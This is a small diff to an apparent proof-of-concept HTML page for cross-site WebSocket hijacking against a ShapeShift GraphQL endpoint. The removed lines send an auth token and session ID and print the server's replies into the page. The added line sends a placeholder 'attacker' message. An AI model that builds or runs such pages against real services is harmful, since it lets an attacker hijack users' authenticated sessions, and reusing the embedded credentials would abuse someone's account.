@@ -6,14 +6,10 @@
 <script>
 websocket = new WebSocket('wss://graphql.beta.shapeshift.com/')
 websocket.onopen = start
-websocket.onmessage = handleReply
 function start(event) {
-  websocket.send("{"type":"connection_init","payload":{"authToken":"3Hy8DgWAfyXPYPuK4wxCa6RDzjkaRRtyqaJpiDEwH4JM","sessionID":"32de1edc-93b7-4641-a1f7-018516b72e76"}}");
+  websocket.send("this message is sent by the attacker");
 }
-function handleReply(event) {
-  console.log(event.data);
-  document.write("<p>"+event.data+"</p")
-}
+
 </script>
   <h1> Simple Page </h1>
   </body>
